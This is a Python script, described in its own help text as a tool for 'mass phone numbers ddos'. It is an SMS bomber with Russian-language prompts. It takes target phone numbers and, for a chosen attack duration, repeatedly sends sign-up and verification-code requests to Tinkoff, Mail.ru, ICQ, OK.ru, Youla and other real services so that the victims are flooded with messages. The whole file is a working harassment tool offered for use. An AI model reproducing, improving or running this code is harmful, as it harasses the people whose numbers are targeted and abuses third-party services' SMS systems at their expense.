import requests, module, argparse, time, os
from module import clr
phones = []
messagesSend = 0
fileName = ""
timer = int(time.time())
startTime = time.time()

parser = argparse.ArgumentParser(description="Script for mass phone numbers ddos")
parser.add_argument('--phone', type=str, help="Path to file with phone numbers")
args = parser.parse_args()

if args.phone != None:
    fileName = args.phone

def logo():
    print(clr.Fore.MAGENTA + module.logo)
    print(clr.Fore.RED + module.author)
    print(clr.Fore.CYAN + "\n" * 2)

def clearScrean():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def attack():
    global timeAttack
    global startTime
    global messagesSend
    startTime = time.time()
    clearScrean()
    print(clr.Fore.MAGENTA + module.attackLogo + "\n")
    while time.time() < startTime + timeAttack:
        for _phone in phones:
            if _phone == "":
                continue
            try:
                req = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})

                messagesSend+=1
                print(f"[{messagesSend}] Tinkoff отправлен")
            except:
                print("Tinkoff не отправле")
            try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
                messagesSend += 1
                print(f"[{messagesSend}] Sunlight отправлен")
            except:
                print("Sunlight не отправлен")
            try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
                messagesSend += 1
                print(f"[{messagesSend}] MTS отправлен")
            except:
                print("MTS не отправлен")

            try:
                requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                              json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
                messagesSend += 1
                print(f"[{messagesSend}] Mail.ru отправлен")
            except:
                print("Mail.ru не отправлен")

            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                              data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                messagesSend += 1
                print(f"[{messagesSend}] ICQ отправлен")
            except:
                print("ICQ не отправлен")

            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                              data={"st.r.phone": "+" + _phone})
                messagesSend += 1
                print(f"[{messagesSend}] OK отправлен")
            except:
                print("OK не отправлен")

            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
                messagesSend += 1
                print(f"[{messagesSend}] Citilink отправлен")
            except:
                print("Citilink не отправлен")

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
                messagesSend += 1
                print(f"[{messagesSend}] Youla отправлен")
            except:
                print("Youla не отправлен")

            # try:
            #     messagesSend += 1
            #     print(f"[{messagesSend}]  отправлен")
            # except:
            #     print(" не отправлен")
            #
            # try:
            #     messagesSend += 1
            #     print(f"[{messagesSend}]  отправлен")
            # except:
            #     print(" не отправлен")
            time.sleep(2)

clearScrean()
logo()

print(clr.Fore.CYAN + module.choice)

mode = input("Выберите режим: ")
if mode == "1":
    clearScrean()
    logo()
    phones = [input("Введите номер телефона: ")]
elif mode == "2":
    clearScrean()
    logo()
    phones = input("Введите номера: ").split(" ")
elif mode == "3":
    clearScrean()
    logo()
    if fileName == "":
        fileName = input("Введите название файла: ")
    with open(fileName, "r") as file:
        phones = file.read().split("\n")
elif mode == "4":
    quit()

for i in range(phones.count("")):
    phones.remove("")

print("\nНомера телефонов для атаки:")
for i in range(len(phones)):
    print("[" + str(i+1) + "]: " + phones[i])

timeAttack = int(input("\n" + clr.Fore.RED + "Введи время атаки (в секундах): "))

answ = input("\n" + clr.Fore.RED + "Вы хотите запустить атаку? (1 - Да, 2 - По таймеру, 3 - Нет): ")
if answ == "1":
    attack()
elif answ == "2":
    waitTimeRaw = input("\nЧерез сколько запустить спам (мин:секунды): ").split(":")
    waitTime = int(waitTimeRaw[0]) * 60 + int(waitTimeRaw[1])

    timer = int(time.time())
    lastval = int(time.time()) - timer
    clearScrean()
    logo()

    while int(time.time()) - timer < waitTime:
        # print(time.time() - timer)
        if lastval != int(time.time()) - timer:
            lastval = int(time.time()) - timer
            print("Осталось: " + str(waitTime - lastval))
    attack()
elif answ == "3":
    quit()